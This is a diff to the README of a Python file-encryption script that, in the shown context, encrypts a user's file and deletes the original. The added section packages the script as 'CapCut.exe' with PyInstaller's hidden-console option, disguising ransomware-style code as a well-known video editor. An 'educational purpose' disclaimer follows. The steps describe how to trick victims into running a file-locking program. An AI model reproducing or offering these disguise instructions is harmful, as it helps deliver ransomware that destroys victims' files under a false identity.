@@ -113,4 +113,23 @@ The input is: C:\Important_File\photo.jpg
 Output after encryption: C:\Important_File\photo.jpg.encrypted\n  
 
 **The original photo.jpg is deleted.**  
+### 📦 Convert to .exe using PyInstaller
+
+To turn the script into an .exe named **CapCut.exe**:  
+**pyinstaller --onefile --noconsole encryptor.py -n CapCut.exe**  
+
+- `--onefile`: Bundle everything in a single executable.  
+- `--noconsole`: Hides the command prompt window.  
+- `-n CapCut.exe`: Sets the output file name.  
+
+---
+
+### 📌 Educational Purpose
+
+⚠ This encryptor is strictly for educational use in a controlled environment to understand how ransomware works.
+
+- Demonstrates encryption workflow using AES.
+- Shows how files can be programmatically locked and disguised.
+- Useful for learning cybersecurity defense techniques.
+
 
